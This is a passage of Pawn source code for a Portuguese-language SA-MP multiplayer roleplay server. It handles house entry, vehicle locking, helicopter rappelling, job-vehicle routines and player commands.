	    	new value, int;

		   	hpath = GetHouseFilePath(House[playerid]);
			value = hGetInt(hpath, "Value");
			int = -1;
			
            for(new house = 0; house < sizeof HouseInteriors; house++)
			{
			    if(HouseInteriors[house][hintValue] == value)
			    {
			        int = house;
			        break;
			    }
			}

			if(int != -1)
			{
		    	if(GetPlayerInterior(playerid) != 0)
		    	{
					new Float:X, Float:Y, Float:Z, Float:HX, Float:HY, Float:HZ, Float:HA;

					GetPlayerPos(playerid, X, Y, Z);
					LoadHousePos(House[playerid], HX, HY, HZ, HA);

					if(GetDistance(X, Y, Z, HouseInteriors[int][hintX], HouseInteriors[int][hintY], HouseInteriors[int][hintZ]) > 2.5)
					    return 1;
				    
	                TextDrawHideForPlayer(playerid, tdexit);
	                SetPlayerVirtualWorld(playerid, 0);
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, HX, HY, HZ);
					SetPlayerFacingAngle(playerid, HA);
					House[playerid] = -1;
				}

				else
				{
				    TextDrawHideForPlayer(playerid, tdjoin);
				    TextDrawHideForPlayer(playerid, tdhouse[playerid]);
					SetPlayerVirtualWorld(playerid, House[playerid] + 1);
					SetPlayerInterior(playerid, HouseInteriors[int][hintInt]);
					SetPlayerPos(playerid, HouseInteriors[int][hintX], HouseInteriors[int][hintY], HouseInteriors[int][hintZ]);
				}
			}
			
			return 1;
		}
	}
	
	if(PressedKey(K_LOCK, newkeys, oldkeys) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
	    new vehid;
	    
	    vehid = GetPlayerVehicleID(playerid);
	    
	    if(IsPlayerVehicle(vehid))
     	{
     	    new vpath[128], kit;
     	    
     	    vpath = GetVehicleFilePath(vehid);
     	    
     	    kit = hGetInt(vpath, "Params") & 3;
     	    
     	    if(kit != 2 && kit != 3)
     	    {
     	        SendClientMessage(playerid, COLOUR_GRAY, "Este veículo não está com as travas acionadas.");
     	        return 1;
     	    }
     	    
     	    kit = ((kit + 1) % 2) + 2;
     	    hSetInt(vpath, "Params", hGetInt(vpath, "Params") | (kit & 3));
     	    
	    	if(kit == 3)
	    	{
	            new owner[128];
	            
				owner = hGetString(vpath, "Owner");
				
				for(new n = 0; n < MAX_SLOTS; n++)
				{
				    if(n != playerid && !IsPlayerAdmin(n) && strcmp(PlayerName(n), owner, true) != 0)
				        SetVehicleParamsForPlayer(vehid, n, 0, 1);
				}
				
				DrawTextForPlayer(playerid, "Veículo trancado.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 500);
	        }
	        
	        else if(kit == 2)
	        {
	            for(new n = 0; n < MAX_SLOTS; n++)
    				SetVehicleParamsForPlayer(vehid, n, 0, 0);
				
				DrawTextForPlayer(playerid, "Veículo destrancado.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 500);
	        }
	    }
	    
	    else
	    {
	        for(new dsc = 0; dsc < sizeof DRIVING_SCHOOL_CAR; dsc++)
	    	{
	        	if(vehid == DRIVING_SCHOOL_CAR[dsc])
		        	return 1;
		    }
		    
		    for(new dsb = 0; dsb < sizeof DRIVING_SCHOOL_BOAT; dsb++)
	    	{
	        	if(vehid == DRIVING_SCHOOL_BOAT[dsb])
		        	return 1;
		    }

		    for(new dsp = 0; dsp < sizeof DRIVING_SCHOOL_PLANE; dsp++)
		    {
		        if(vehid == DRIVING_SCHOOL_PLANE[dsp])
			        return 1;
		    }
		    
	        if(WorkVehicle[playerid] != vehid)
	        {
	            for(new n = 0; n < MAX_SLOTS; n++)
			    {
			        if(n != playerid)
    					SetVehicleParamsForPlayer(vehid, n, 0, 0);
				}

				WorkVehicle[playerid] = vehid;
				DrawTextForPlayer(playerid, "Veículo trancado.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 500);
			}
			
			else
			{
			    for(new n = 0; n < MAX_SLOTS; n++)
    				SetVehicleParamsForPlayer(vehid, n, 0, 0);

				WorkVehicle[playerid] = -1;
				DrawTextForPlayer(playerid, "Veículo destrancado.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 500);
			}
	    }
	}
	
	if(PressedKey(K_ROPE, newkeys, oldkeys) && GetPlayerState(playerid) == PLAYER_STATE_PASSENGER)
	{
	    new vehid, model;
	    new Float:PX, Float:PY, Float:VX, Float:VY, Float:VZ, Float:X, Float:Y, Float:Z, Float:A, Float:N, Float:S;
	    
	    vehid = GetPlayerVehicleID(playerid);
	    model = GetVehicleModel(vehid);
	    
	    if(IsJobVehicle(vehid, POLICE_CAR) && model == 497)
	    {
	        new seat;

			seat = GetPlayerVehicleSeat(playerid);
			GetVehiclePos(vehid, VX, VY, VZ);
			GetVehicleZAngle(vehid, A);
	        SetVehicleVelocity(vehid, 0.0, 0.0, 0.0);
	        
	        switch(seat)
	        {
				case 1:
				    N = 315.0, S = 1.0;
				
				case 2:
				    N = -45.0, S = -1.0;
				
				case 3:
				    N = 45.0, S = -1.0;
	        }

            X = VX + S * floatsin(-(A + N), degrees);
			Y = VY + S * floatcos(-(A + N), degrees);
			Z = VZ - 1.0;
			PX = X + 0.1 * floatsin(-A, degrees);
			PY = Y + 0.1 * floatcos(-A, degrees);
            SetPlayerPos(playerid, PX, PY, Z);
            SetPlayerFacingAngle(playerid, 250.0 - atan2(PX - X, PY - Y));
            SetPlayerVelocity(playerid, 0.0, 0.0, -0.25);
            SetCameraBehindPlayer(playerid);
			
			for(new r = 0; r < ROPES; r++)
			{
				if(Ropes[playerid][r] != -1)
				    DestroyObject(Ropes[playerid][r]);
				
			    Z -= ROPE_HEIGHT;
			    Ropes[playerid][r] = CreateObject(19089, X, Y, Z, 0.0, 0.0, 0.0);
			}
			
			RopeCount[playerid] = 0;
			RopeHeli[playerid] = vehid;
			RopeHeliPos[playerid][0] = VX;
			RopeHeliPos[playerid][1] = VY;
			RopeHeliPos[playerid][2] = VZ;
			PlayerEvent[playerid] |= PLAYER_EVENT_ROPE;
			ApplyAnimation(playerid, "PED", "abseil", 4.1, 0, 1, 1, 1, -1, 1);
	    }
	}
	
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && IsPlayerAdmin(n) &&	GetPlayerState(n) == PLAYER_STATE_SPECTATING && AdminData[n][admSpec] == playerid)
	    {
	    	if(!IsPlayerInAnyVehicle(playerid))
	        	PlayerSpectatePlayer(n, playerid);
	        	
			else
			    PlayerSpectateVehicle(n, GetPlayerVehicleID(playerid));
		}
	}
	
	if(oldstate == PLAYER_STATE_DRIVER)
	{
	    HidePlayerFuelText(playerid);
            
	    for(new g = 0; g < sizeof tdgas; g++)
            TextDrawHideForPlayer(playerid, tdgas[g]);

	   	TextDrawHideForPlayer(playerid, tdspeed[playerid]);
	   	TextDrawHideForPlayer(playerid, tdvinfo[playerid]);
	   	TextDrawHideForPlayer(playerid, tdhealthbar[playerid]);
		TextDrawHideForPlayer(playerid, tdhealth);
		VHealthText[playerid] = -1;
		VFrozenFlags[playerid] = 0;
	}
	
	if(IsPlayerInAnyVehicle(playerid))
 	{
 	    new vehid;
     	
     	vehid = GetPlayerVehicleID(playerid);
     	
     	if(IsPlayerVehicle(vehid))
     	{
     	    new vpath[128];
     	    
     	    vpath = GetVehicleFilePath(vehid);
     	    
     	    if(hGetInt(vpath, "Params") & 4)
     	        SetPlayerColour(playerid, GetPlayerColour(playerid) & 0xFFFFFF00);
     	}
   	}
   	
   	else
   	{
   	    SetPlayerColour(playerid, GetPlayerColour(playerid) | 0xAA);
	}
	
	if(newstate == PLAYER_STATE_DRIVER)
	{
	    new string[256], owner[128], plate[128];
		new vehid, model, job;
		new Float:Z;
		new bool:rc;
		
		vehid = GetPlayerVehicleID(playerid);
        model = GetVehicleModel(vehid);
        job = hGetInt(GetPlayerXFilePath(playerid), "Job");
        rc = false;
        
        if(IsVehicleForSale(vehid))
            return;

        if(ResumeTimer[playerid])
		{
		    if(TaxiDelivery[playerid] != -1 && IsJobVehicle(vehid, TAXI))
		    {
		        DeleteTimer(ResumeTimer[playerid]);
		        SendClientMessage(playerid, COLOUR_CABBIE, "Entregas automáticas retomadas.");
		        DrawTextForPlayer(playerid, "Entregas automaticas retomadas.", COLOUR_CABBIE, TEXTDRAW_STYLE_2, 3000);
		    }
		    
		    if(Corn[playerid] & 0x1 && IsJobVehicle(vehid, FARM) && model == 532)
		    {
		        DeleteTimer(ResumeTimer[playerid]);
		        SendClientMessage(playerid, COLOUR_FARMER, "Plantio retomado.");
		        DrawTextForPlayer(playerid, "Plantio retomado.", COLOUR_FARMER, TEXTDRAW_STYLE_2, 3000);
		    }
		    
		    if(Pouch[playerid] != -1 && IsJobVehicle(vehid, SECURITY))
			{
				DeleteTimer(ResumeTimer[playerid]);
	    		SendClientMessage(playerid, COLOUR_SECURITY, "Transporte retomado.");
	    		DrawTextForPlayer(playerid, "Transporte retomado.", COLOUR_SECURITY, TEXTDRAW_STYLE_2, 3000);
			}
			
	    	if(Transport[playerid] != 0 && IsTrailerAttachedToVehicle(vehid) && GetJobVehicle(GetVehicleTrailer(vehid), TRAILER) == Transport[playerid] - 1)
	    	{
	    	    DeleteTimer(ResumeTimer[playerid]);
	    		SendClientMessage(playerid, COLOUR_TRUCKER, "Transporte retomado.");
	    		DrawTextForPlayer(playerid, "Transporte retomado.", COLOUR_TRUCKER, TEXTDRAW_STYLE_2, 3000);
			}

			if(Terminal[playerid] != 0 && IsJobVehicle(vehid, BUS))
			{
			    DeleteTimer(ResumeTimer[playerid]);
	    		SendClientMessage(playerid, COLOUR_MACHINIST, "Rota retomada.");
	    		DrawTextForPlayer(playerid, "Rota retomada.", COLOUR_MACHINIST, TEXTDRAW_STYLE_2, 3000);
			}
			
			if(Submission[SUBMISSION_ICE_CREAM] == playerid && vehid == ICE_CREAM)
			{
				DeleteTimer(ResumeTimer[playerid]);
				SendClientMessage(playerid, COLOUR_ICE_CREAM, "Entrega retomada.");
				DrawTextForPlayer(playerid, "Entrega retomada.", COLOUR_ICE_CREAM, TEXTDRAW_STYLE_2, 3000);
			}
			
			if(Submission[SUBMISSION_IML] == playerid && vehid == IML)
			{
				DeleteTimer(ResumeTimer[playerid]);
				SendClientMessage(playerid, COLOUR_IML, "Transporte retomado.");
				DrawTextForPlayer(playerid, "Transporte retomado.", COLOUR_IML, TEXTDRAW_STYLE_2, 3000);
			}
			
			if(Submission[SUBMISSION_CEMENT] == playerid && vehid == CEMENT)
			{
				DeleteTimer(ResumeTimer[playerid]);
				SendClientMessage(playerid, COLOUR_CEMENT, "Transporte retomado.");
				DrawTextForPlayer(playerid, "Transporte retomado.", COLOUR_CEMENT, TEXTDRAW_STYLE_2, 3000);
			}
			
			if(Submission[SUBMISSION_POST] == playerid && vehid == POST)
			{
				DeleteTimer(ResumeTimer[playerid]);
				SendClientMessage(playerid, COLOUR_POST, "Manutenção retomada.");
				DrawTextForPlayer(playerid, "Manutenção retomada.", COLOUR_POST, TEXTDRAW_STYLE_2, 3000);
			}
		}
		
		if(IsJobVehicle(vehid, TAXI) && job == JOB_CABBIE && Announce[playerid] <= 0)
		{
		    Announce[playerid] = 30;
 			format(string, sizeof string, "[Yellow's'Taxi] %s está disponível, para contatá-lo, /servico taxi", PlayerName(playerid));
			SendClientMessageToAll(COLOUR_CABBIE, string);
		}
		
		if(IsJobVehicle(vehid, BUS) && job == JOB_MACHINIST && Terminal[playerid] == 0)
		{
			new terminal, route;
			new Float:X, Float:Y;
			
			if(Announce[playerid] <= 0)
			{
				Announce[playerid] = 30;
 				format(string, sizeof string, "[Transportes Públicos] %s entrou em circulação.", PlayerName(playerid));
				SendClientMessageToAll(COLOUR_MACHINIST, string);
			}
			
			terminal = -1;
			route = 1;
			
_loopstart:
			for(new n = 0; n < MAX_SLOTS; n++)
			{
			    if(IsPlayerConnected(n) && IsPlayerLogged(n) && n != playerid)
			    {
			        if(IsPlayerInJobVehicle(n, BUS) && Terminal[n] != 0)
			        {
			            if(BusTerminals[Terminal[n] - 1][btRoute] == route)
			            {
			                route++;
	
	                        if(route > ROUTES)
	                        {
	                            route = random(ROUTES) + 1;
	                            break;
	                        }
	                        
 							goto _loopstart;
			            }
			        }
			    }
			}
			
			for(new bt = 0; bt < sizeof BusTerminals; bt++)
			{
			    if(BusTerminals[bt][btRoute] == route)
			    {
			        terminal = bt;
					break;
			    }
			}
			
			if(terminal != -1)
			{
				X = BusTerminals[terminal][btX] + (5.0 * floatsin(-(BusTerminals[terminal][btRZ] + 90.0), degrees));
				Y = BusTerminals[terminal][btY] + (5.0 * floatcos(-(BusTerminals[terminal][btRZ] + 90.0), degrees));
			
				Terminal[playerid] = terminal + 1;
				SetPlayerRaceCheckpoint(playerid, 1, X, Y, BusTerminals[terminal][btZ], 0.0, 0.0, 0.0, 5.0);
			}
		}
		
		if(IsJobVehicle(vehid, PLANE) && job == JOB_PILOT)
		{
		    switch(model)
		    {
		        case 476:
		        {
		            AirTransport[playerid] = (1 << 1) | 1;
	            	SetPlayerRaceCheckpoint(playerid, 0, Airports[0][0], Airports[0][1], Airports[0][2], 0.0, 0.0, 0.0, 8.0);
	            	SendClientMessage(playerid, COLOUR_PILOT, "Transporte de mercadorias iniciado.");
		        }
		        
				case 487:
				{
				    if(Announce[playerid] <= 0)
					{
						Announce[playerid] = 30;
 						format(string, sizeof string, "[Transportes Aéreos] %s está disponível, para contatá-lo, /servico piloto", PlayerName(playerid));
						SendClientMessageToAll(COLOUR_MACHINIST, string);
					}
				}
				
				case 519:
				{
				    AirTransport[playerid] = (1 << 1) | 0;
	            	SetPlayerRaceCheckpoint(playerid, 0, Airports[0][0], Airports[0][1], Airports[0][2], 0.0, 0.0, 0.0, 8.0);
	            	SendClientMessage(playerid, COLOUR_PILOT, "Transporte de pessoas iniciado.");
				}
		    }
		}
		
        if(IsRCModel(model))
            rc = true;
            
       	for(new g = 0; g < sizeof tdgas; g++)
            TextDrawShowForPlayer(playerid, tdgas[g]);

		TextDrawShowForPlayer(playerid, tdhealth);
		
		if(rc)
		{
		    owner = PlayerName(playerid);
		    format(plate, sizeof plate, "TOY %d", vehid + 1000);
		}
		
		else
		{
       		if(IsServerVehicle(vehid))
			{
    			owner = ("Servidor");
     			format(plate, sizeof plate, "VSR %d", vehid + 1000);
			}

			else
  			{
    			new vpath[128];

	      		vpath = GetVehicleFilePath(vehid);
   				owner = hGetString(vpath, "Owner");
    	  		plate = hGetString(vpath, "NumberPlate");
    	    }
		}

		format(string, sizeof string, "~y~~h~Modelo: ~w~%s~n~~y~~h~Proprietário: ~w~%s~n~~y~~h~Placa: ~w~%s",   Vehicles[GetVehicleModel(vehid)-400][vehModel],
		                                                                                                        owner,
		                                                                                                        plate);
		                                                                                                        
 		TextDrawSetString(tdspeed[playerid], "0km/h");
 		TextDrawSetString(tdvinfo[playerid], TEXT(string));
 		TextDrawShowForPlayer(playerid, tdspeed[playerid]);
 	    TextDrawShowForPlayer(playerid, tdvinfo[playerid]);
	    UpdatePlayerFuelText(playerid);
	    UpdatePlayerHealthText(playerid);
	    SetPlayerArmedWeapon(playerid, 0);
		GetVehiclePos(vehid, VCoords[playerid][0], VCoords[playerid][1], Z);
	}
	
	if(newstate == PLAYER_STATE_ONFOOT)
	{
	    if(oldstate == PLAYER_STATE_DRIVER)
	    {
	        if(ArrowObject[playerid] != -1)
 			{
	        	DestroyPlayerObject(playerid, ArrowObject[playerid]);
	        	ArrowObject[playerid] = -1;
			}
			
			if(PizzaDelivery[playerid] == 2)
			{
			    SetPlayerAttachedObject(playerid, OBJECT_SLOT_CARRY, 1582, 6, 0.15, 0.1, 0.0, 90.0, 0.0, 340.0);
			    ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1);
			    DrawTextForPlayer(playerid, "Leve a pizza até a porta.", COLOUR_PIZZABOY, TEXTDRAW_STYLE_2, 3000);
			}
			
			if(AirTransport[playerid] > 0)
			{
			    AirTransport[playerid] = 0;
			    DisablePlayerRaceCheckpoint(playerid);
			    SendClientMessage(playerid, COLOUR_PILOT, "Transporte cancelado.");
			}
			
			if(!ResumeTimer[playerid])
			{
			    if(TaxiDelivery[playerid] != -1)
				{
			    	SendClientMessage(playerid, COLOUR_CABBIE, "Você tem 10 segundos para voltar ao taxi e retomar as entregas.");
			    	DrawTextForPlayer(playerid, "Volte ao taxi.", COLOUR_CABBIE, TEXTDRAW_STYLE_2, 3000);
			    	ResumeTimer[playerid] = SetTimerEx("Resume", 10000, false, "d", playerid);
				}
			
			    if(Corn[playerid] & 0x1)
			    {
			        SendClientMessage(playerid, COLOUR_FARMER, "Você tem 10 segundos para voltar à combine da fazenda e retomar o plantio.");
				    DrawTextForPlayer(playerid, "Volte a combine.", COLOUR_FARMER, TEXTDRAW_STYLE_2, 3000);
					ResumeTimer[playerid] = SetTimerEx("Resume", 10000, false, "d", playerid);
			    }
			    
				if(Transport[playerid] != 0)
				{
				    SendClientMessage(playerid, COLOUR_TRUCKER, "Você tem 10 segundos para voltar ao caminhão e retomar o transporte.");
				    DrawTextForPlayer(playerid, "Volte ao caminhão.", COLOUR_TRUCKER, TEXTDRAW_STYLE_2, 3000);
					ResumeTimer[playerid] = SetTimerEx("Resume", 10000, false, "d", playerid);
				}
				
				if(Terminal[playerid] != 0)
				{
				    SendClientMessage(playerid, COLOUR_TRUCKER, "Você tem 10 segundos para voltar ao ônibus e retomar a rota.");
				    DrawTextForPlayer(playerid, "Volte ao ônibus.", COLOUR_MACHINIST, TEXTDRAW_STYLE_2, 3000);
					ResumeTimer[playerid] = SetTimerEx("Resume", 10000, false, "d", playerid);
				}
				
				if(Pouch[playerid] != -1)
				{
				    SendClientMessage(playerid, COLOUR_SECURITY, "Você tem 20 segundos para levar o malote ao banco ou voltar ao carro forte.");
                    DrawTextForPlayer(playerid, "Leve o malote ao banco ou volte ~n~ao carro forte.", COLOUR_SECURITY, TEXTDRAW_STYLE_2, 3000);
					ResumeTimer[playerid] = SetTimerEx("Resume", 20000, false, "d", playerid);
				}
				
				if(Submission[SUBMISSION_ICE_CREAM] == playerid)
				{
				    SendClientMessage(playerid, COLOUR_ICE_CREAM, "Você tem 10 segundos para voltar ao carro de sorvete e retomar as entregas.");
				    DrawTextForPlayer(playerid, "Volte ao carro de sorvete.", COLOUR_ICE_CREAM, TEXTDRAW_STYLE_2, 3000);
				    ResumeTimer[playerid] = SetTimerEx("Resume", 10000, false, "d", playerid);
				}

				if(Submission[SUBMISSION_CEMENT] == playerid)
				{
				    SendClientMessage(playerid, COLOUR_CEMENT, "Você tem 10 segundos para voltar ao caminhão de cimento e retomar o transporte.");
				    DrawTextForPlayer(playerid, "Volte ao caminhão de cimento.", COLOUR_CEMENT, TEXTDRAW_STYLE_2, 3000);
				    ResumeTimer[playerid] = SetTimerEx("Resume", 10000, false, "d", playerid);
				}
				
				if(Submission[SUBMISSION_IML] == playerid)
				{
				    SendClientMessage(playerid, COLOUR_IML, "Você tem 10 segundos para voltar ao carro funerário e retomar o transporte.");
				    DrawTextForPlayer(playerid, "Volte ao carro funerário.", COLOUR_IML, TEXTDRAW_STYLE_2, 3000);
				    ResumeTimer[playerid] = SetTimerEx("Resume", 10000, false, "d", playerid);
				}
				
				if(Submission[SUBMISSION_POST] == playerid)
				{
				    SendClientMessage(playerid, COLOUR_POST, "Você tem 10 segundos para voltar ao carro de eletricidade e retomar a manutenção.");
				    DrawTextForPlayer(playerid, "Volte ao carro de eletricidade.", COLOUR_POST, TEXTDRAW_STYLE_2, 3000);
				    ResumeTimer[playerid] = SetTimerEx("Resume", 10000, false, "d", playerid);
				}
			}
	    }
	    
	    Weapon[playerid] = -1;
	    WorkVehicle[playerid] = -1;
	}
	
	if(newstate == PLAYER_STATE_PASSENGER)
	{
	    new msg[128];
	    new vehid;
	    
	    vehid = GetPlayerVehicleID(playerid);
		
	    if(IsJobVehicle(vehid, POLICE_CAR) && GetVehicleModel(vehid) == 497)
	    {
	        format(msg, sizeof msg, "~b~Pressione ~w~%s ~b~para usar o rapel.", GetKeyName(K_ROPE, 0));
            DrawTextForPlayer(playerid, msg, COLOUR_WHITE, TEXTDRAW_STYLE_2, 5000);
		}
		
		if(IsJobVehicle(vehid, NEWS) && GetVehicleModel(vehid) == 488)
		{
		    CameraStyle[playerid] = 0;
		    KeyEvent[playerid] |= KEY_EVENT_NEWS;
		    PlayerEvent[playerid] |= PLAYER_EVENT_NEWS;
		}
		
		if(IsJobVehicle(vehid, TAXI))
		{
		    for(new n = 0; n < MAX_SLOTS; n++)
		    {
				if(IsPlayerConnected(n) && IsPlayerLogged(n) && n != playerid)
				{
				    if(IsPlayerInVehicle(n, vehid) && GetPlayerState(n) == PLAYER_STATE_DRIVER && (hGetInt(GetPlayerXFilePath(n), "Job") == JOB_CABBIE || IsPlayerAdmin(n)) && Taximeter[n] == -1)
				    {
				    	if(GetPlayerSysMoney(playerid) < 5)
						{
						    SendClientMessage(playerid, COLOUR_WHITE, "Você não possui dinheiro.");
						    RemovePlayerFromVehicle(playerid);
						}

						else if(TaxiDelivery[n] != -1)
						{
						    SendClientMessage(playerid, COLOUR_WHITE, "Este taxi está ocupado realizando entregas.");
						    RemovePlayerFromVehicle(playerid);
						}
						
						else
						{
						    new Text:tdtaxi;
						    
						    tdtaxi = TextDrawCreate(21.0, 125.0, TEXT("~y~Taxímetro: ~g~$~w~0,00 dólares"));
							TextDrawAlignment(tdtaxi, 0);
							TextDrawFont(tdtaxi, 1);
							TextDrawLetterSize(tdtaxi, 0.5, 1.5);
							TextDrawColour(tdtaxi, COLOUR_WHITE);
							TextDrawSetProportional(tdtaxi, 1);
							TextDrawSetShadow(tdtaxi, 1);
			
			                TextDrawShowForPlayer(n, tdtaxi);
							TextDrawShowForPlayer(playerid, tdtaxi);
							Taximeter[n] = 0;
							Taximeter[playerid] = n;
							SendClientMessage(n, COLOUR_CABBIE, "Taximetro iniciado.");
							SendClientMessage(playerid, COLOUR_WHITE, "O taximetro começou a rodar.");
							SetTimerEx("Taxi", 5000, false, "dddd", n, playerid, vehid, _:tdtaxi);
						}
					}
				}
			}
		}
		
		if(IsJobVehicle(vehid, BUS) || IsJobVehicle(vehid, TRAIN))
		{
		    for(new n = 0; n < MAX_SLOTS; n++)
		    {
				if(IsPlayerConnected(n) && IsPlayerLogged(n) && n != playerid)
				{
				    if(IsPlayerInVehicle(n, vehid) && GetPlayerState(n) == PLAYER_STATE_DRIVER && Terminal[n] != 0)
				    {
				        if(GetPlayerSysMoney(playerid) < 20)
				        {
				            SendClientMessage(playerid, COLOUR_WHITE, "Você não possui dinheiro para comprar um Ticket. Custo: $20,00 dólares.");
				            RemovePlayerFromVehicle(playerid);
				        }
				        
				        else
				        {
				            Pay(n, 20);
				        	GivePlayerSysMoney(playerid, -20);
				        	SendClientMessage(playerid, COLOUR_WHITE, "Ticket adquirido por $20,00 dólares.");
				        	SendClientMessage(n, COLOUR_MACHINIST, "Ticket vendido.");
						}
					}
				}
		    }
		}
	}
}

public OnPlayerCommandText(playerid, cmdtext[])
{
	if(!IsPlayerLogged(playerid))
	{
	    DrawTextForPlayer(playerid, "Você deve efetuar login para fazer isso.", COLOUR_RED, TEXTDRAW_STYLE_3, 2000);
	    return 1;
	}
	
    new cmd[128], animlib[64], animname[64];
	new idx, pjob, animindex, idle;

    idx = 0;
    
	if(strcmp(cmdtext, "/ajuda", true) == 0 || strcmp(cmdtext, "/help", true) == 0)
	{
	    SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Comandos principais:");
	    SendClientMessage(playerid, COLOUR_SKY_BLUE, "/r [texto] - /a [texto] - /c [texto] - /g [texto] - /status [categoria] - /animacoes - /emprego");
	    SendClientMessage(playerid, COLOUR_SKY_BLUE, "/casa - /veiculo - /empresa - /walktalkie - /gangue - /celular - /teclas - /usarskin [pessoal/trabalho]");
	    SendClientMessage(playerid, COLOUR_SKY_BLUE, "/votekick [id] [motivo] - /votar - /gps [local/desligar] - /pagar - /transferir - /presos - /procurados");
	    SendClientMessage(playerid, COLOUR_SKY_BLUE, "/teste - /porte - /documentos [id] - /vdocumentos [id] - /pagardividas [pessoal/veicular] [placa]");
		SendClientMessage(playerid, COLOUR_SKY_BLUE, "/pagarfianca - /submissao - /acessorios - /acessorio - /armas - /novidades");
	    return 1;
	}
	
	if(strcmp(cmdtext, "/teclas", true) == 0 || strcmp(cmdtext, "/keys", true) == 0)
	{
	    SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Teclas de jogo:");
	    SendClientMessage(playerid, COLOUR_SKY_BLUE, "[ALT]: utilizada para entrar e sair de lugares.");
	    SendClientMessage(playerid, COLOUR_SKY_BLUE, "[2]: utilizada em um veículo para acionar ou desacionar suas travas.");
	    SendClientMessage(playerid, COLOUR_SKY_BLUE, "[Espaco]: utilizada para pegar armas no chão.");
	    return 1;
	}
	
	if(strcmp(cmdtext, "/acoes", true) == 0 || strcmp(cmdtext, "/actions", true) == 0)
	{
	    new string[2048];
		new align;

		align = 2;
		
		for(new a = 0; a < sizeof Actions; a++)
		{
			if(strlen(Actions[a][actionCmd]) > 0)
			{
		    	if(!strlen(string))
		    	    format(string, sizeof string, "{FFFFFF}/renderse - /dancar - %s", Actions[a][actionCmd]);

			    else if(align % 7 != 0)
			        format(string, sizeof string, "%s - %s", string, Actions[a][actionCmd]);

			    else
					format(string, sizeof string, "%s\r\n%s", string, Actions[a][actionCmd]);
					
				align++;
			}
		}

		ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{00FF00}Ações", string, "Fechar", "");
		return 1;
	}
	
	cmd = strtok(cmdtext, idx);
	pjob = hGetInt(GetPlayerXFilePath(playerid), "Job");
	animindex = GetPlayerAnimationIndex(playerid);
	GetAnimationName(animindex, animlib, sizeof animlib, animname, sizeof animname);
	
	if(!IsPlayerAdmin(playerid))
	{
		for(new j = 0; j < sizeof JobCommands; j++)
		{
		    new offset_idx;
		    
		    offset_idx = 0;
		    
			if(strlen(JobCommands[j][jCmd]) > 0 && strcmp(cmd, strtok(JobCommands[j][jCmd], offset_idx), true) == 0)
			{
				new bool:ok;
				
				ok = false;
				
			    for(new jid = 0; jid < 6; jid++)
		    	{
					if(pjob == JobCommands[j][jJobs][jid])
					{
					    ok = true;
					    break;
					}
				}
				
				if(!ok)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não tem permissão para usar este comando.");
			        return 1;
				}
			    
			    break;
			}
		}
	}
    
    idle = (animindex == 0 || strfind(animname, "idle", true) != -1);
    	
    if(idle)
	{
		for(new a = 0; a < sizeof Actions; a++)
		{
		    if(strlen(Actions[a][actionCmd]) > 0)
		    {
		    	new offset_idx;

				if(strcmp(cmd, Actions[a][actionCmd], true, strlen(Actions[a][actionCmd])) == 0)
				{
				    ApplyAnimation(playerid, Actions[a][actionLib], Actions[a][actionName], 4.1, Actions[a][actionLoop], 1, 1, 1, 1, 1);
				    return 1;
				}
				
				offset_idx = 0;

			    if(strcmp(cmd, strtok(Actions[a][actionCmd], offset_idx), true) == 0)
			    {
			        new errmsg[128];
			        new actionid, n;
			        
			        n = strval(strtok(cmdtext, idx));
			        actionid = a + n - 1;
			        format(errmsg, sizeof errmsg, "USO: %s", Actions[a][actionCmd]);
			            
					if(n <= 0 || actionid < 0 || actionid >= sizeof Actions)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, errmsg);
				 		return 1;
					}
					    
					for(new m = a; m < a + n; m++)
					{
					    if(m != a && strlen(Actions[m][actionCmd]) > 0)
					    {
					   		SendClientMessage(playerid, COLOUR_GRAY, errmsg);
							return 1;
						}
					}
					
    				ApplyAnimation(playerid, Actions[actionid][actionLib], Actions[actionid][actionName], 4.1, Actions[actionid][actionLoop], 1, 1, 1, 1, 1);
					return 1;
		    	}
			}
		}
	}
	
    if(strcmp(cmd, "/novidades", true) == 0 || strcmp(cmd, "/news", true) == 0)
	{
	    new n;

	    n = strval(strtok(cmdtext, idx));

	    if(n == 1)
	    {
	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Novidades - Parte I - Empregos:");
	        SendClientMessage(playerid, COLOUR_WHITE, "Para arranjar um emprego, você deve ir para a empresa do mesmo e assinar um contrato,");
	        SendClientMessage(playerid, COLOUR_WHITE, "tendo que permanecer nesse emprego durante um certo tempo para poder trocá-lo.");
	        SendClientMessage(playerid, COLOUR_WHITE, "Durante seu jogo, irá acumular Level, e irá tendo acesso a outros empregos.");
	        SendClientMessage(playerid, COLOUR_WHITE, "É proibido burlar o sistema de level, como por exemplo upar com ajuda de amigos, isto");
	        SendClientMessage(playerid, COLOUR_WHITE, "acarretará em punições graves, como banimento, remoção da conta e/ou reinício da mesma.");
	        SendClientMessage(playerid, COLOUR_WHITE, "Cada level corresponde a 7 Xpoints.");
	        SendClientMessage(playerid, COLOUR_WHITE, "Confira os comandos disponíveis em seu emprego, /emprego [lista]");
	        return 1;
	    }

	    if(n == 2)
	    {
	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Novidades - Parte II - Armas:");
	        SendClientMessage(playerid, COLOUR_WHITE, "Você apenas poderá carregar 3 armas, uma arma leve, uma arma pesada e uma arma branca.");
	        SendClientMessage(playerid, COLOUR_WHITE, "Sua arma pesada ficará a mostra para as outras pessoas, portanto não saiá com ela na rua");
	        SendClientMessage(playerid, COLOUR_WHITE, "se não estiver procurando encrenca.");
	        SendClientMessage(playerid, COLOUR_WHITE, "Além disso, é necessário obter licensa para armas, ou poderá ser preso.");
	        SendClientMessage(playerid, COLOUR_WHITE, "As armas leves e armas pesadas possuem limite de munição, ao ser morto você");
	        SendClientMessage(playerid, COLOUR_WHITE, "irá perder as armas que estiver carregando.");
	        return 1;
	    }

	    if(n == 3)
	    {
